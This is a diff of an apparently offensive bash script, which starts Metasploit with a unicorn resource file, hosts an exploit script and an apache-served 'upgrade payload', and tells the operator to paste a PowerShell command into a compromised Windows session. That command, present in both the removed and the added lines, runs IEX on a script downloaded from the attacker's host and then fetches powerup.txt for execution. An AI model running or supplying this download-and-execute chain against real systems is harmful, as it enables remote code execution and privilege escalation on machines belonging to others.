@@ -47,9 +47,9 @@ xterm -fa monaco -fs 13 -bg black -e msfconsole -r unicorn.rc &
 echo ""
 cd execution
 echo ""
-echo -e "Get Port For Script::"
+echo -e "Get Script Options::"
 echo ""
-echo -e -n $cyan"	Set "$white"LPORT"$cyan" for Script--> "
+echo -e -n $cyan"	"$white"LPORT"$cyan" to host script on--> "
 read scriptport
 echo ""
 echo -e "["$white">"$cyan"] Hosting exploit script on port " $scriptport
@@ -58,7 +58,16 @@ echo ""
 echo -e "["$white">"$cyan"] Hosting upgrade payload via apache"
 service apache2 restart > /dev/null 2>&1
 echo ""
-echo -e "["$white"<"$cyan"-"$white">"$cyan"] Please paste this into your current windows shell: "
+echo -e "["$white">"$cyan"] Please paste this into your current windows cmd session: "
 echo ""
-echo -e $red""
-echo "powershell.exe "\"IEX \(new-object net.webclient\).downloadstring\("'"http://$lhost:$scriptport/Download-Execute-PS.ps1"'"\)";"Download-Execute-PS http://$lhost/powerup.txt";""\""
+echo ""
+echo -e "["$white">"$cyan"]"$red" powershell.exe "\"IEX \(new-object net.webclient\).downloadstring\("'"http://$lhost:$scriptport/Download-Execute-PS.ps1"'"\)";"Download-Execute-PS http://$lhost/powerup.txt"; ""\""$cyan"["$white"<"$cyan"]"
+echo ""
+echo ""
+echo -e $cyan"["$white">"$cyan"] ::Script Complete::"
+echo ""
+
+
+
+
+
